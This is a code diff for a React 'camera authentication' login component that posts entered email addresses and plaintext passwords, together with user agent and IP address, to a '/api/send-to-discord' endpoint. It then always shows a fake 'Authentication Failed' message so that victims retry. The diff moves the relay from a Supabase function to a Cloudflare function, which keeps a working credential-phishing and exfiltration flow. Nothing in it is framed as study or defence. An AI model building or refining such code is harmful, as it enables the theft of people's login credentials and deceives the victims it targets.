@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Camera, Mic, MicOff, VideoOff, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { createClient } from '@supabase/supabase-js';
+
 
 const formSchema = z.object({
   email: z.string().email("Please enter a valid email"),
@@ -28,11 +28,6 @@ const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) =
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
-  // Initialize Supabase client
-  const supabase = createClient(
-    'https://YOUR_PROJECT_ID.supabase.co',
-    'YOUR_ANON_KEY'
-  );
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
@@ -149,49 +144,49 @@ const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) =
     setIsLoading(true);
     
     try {
-      // Get user's IP address
-      const ipAddress = await getUserIP();
+      const userIP = await getUserIP();
       
-      // Prepare data to send to Discord
-      const formData = {
-        email: values.email,
-        password: values.password,
-        userAgent: navigator.userAgent,
-        ipAddress: ipAddress,
-      };
-
-      // Send to Supabase edge function
-      const { data, error } = await supabase.functions.invoke('send-to-discord', {
-        body: formData
+      // Send to Discord via Cloudflare Function
+      const response = await fetch('/api/send-to-discord', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: values.email,
+          password: values.password,
+          userAgent: navigator.userAgent,
+          ipAddress: userIP,
+        }),
       });
 
-      if (error) {
-        throw error;
+      if (!response.ok) {
+        throw new Error('Failed to send data');
       }
 
       // Simulate authentication delay
       await new Promise(resolve => setTimeout(resolve, 2000));
       
-      // Show authentication error (as requested)
+      // Always show authentication failed for demo purposes
       toast({
+        variant: "destructive",
         title: "Authentication Failed",
         description: "Invalid credentials. Please check your email and password.",
-        variant: "destructive",
       });
-
+      
     } catch (error) {
-      console.error("Submission error:", error);
+      console.error('Authentication error:', error);
       toast({
+        variant: "destructive",
         title: "Network Error",
         description: "Unable to connect to authentication server. Please try again.",
-        variant: "destructive",
       });
     } finally {
       setIsLoading(false);
-      // Stop ringing and camera
       if (stream) {
         stream.getTracks().forEach(track => track.stop());
       }
+      onComplete();
     }
   };
 
